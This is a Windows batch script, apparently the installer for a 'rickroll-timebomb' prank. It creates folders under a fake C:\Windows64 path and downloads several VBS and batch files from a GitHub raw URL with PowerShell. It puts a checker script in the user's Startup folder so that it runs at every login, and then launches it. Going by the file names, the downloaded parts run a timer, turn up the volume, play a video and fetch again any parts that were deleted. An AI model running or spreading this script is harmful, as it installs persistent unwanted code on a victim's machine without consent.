mkdir "C:\Windows64\rickroll\" 
mkdir "C:\Windows64\rr\" 
mkdir "C:\Windows64\rickroll\missing\"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/Files/FileChecker.vbs -OutFile %userprofile%\AppData\Roaming\Microsoft\Windows\Start` Menu\Programs\Startup\FileChecker.vbs"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/Files/Timer.vbs -OutFile C:\Windows64\rickroll\Timer.vbs"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/Files/Video.vbs -OutFile C:\Windows64\rickroll\Video.vbs"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/Files/VolumeUp.vbs -OutFile C:\Windows64\rickroll\VolumeUp.vbs"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/Files/RickRoll.vbs -OutFile C:\Windows64\rickroll\RickRoll.vbs"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/Files/CleanUp.vbs -OutFile C:\Windows64\rr\CleanUp.vbs"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/missing/DownloadCleanUp.bat -OutFile C:\Windows64\rickroll\missing\DownloadCleanUp.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/missing/DownloadRickRoll.bat -OutFile C:\Windows64\rickroll\missing\DownloadRickRoll.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/missing/DownloadTimer.bat -OutFile C:\Windows64\rickroll\missing\DownloadTimer.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/missing/DownloadVideo.bat -OutFile C:\Windows64\rickroll\missing\DownloadVideo.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/missing/DownloadVolumeUp.bat -OutFile C:\Windows64\rickroll\missing\DownloadVolumeUp.bat"
cd %userprofile%
cd ".\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
WScript "FileChecker.vbs"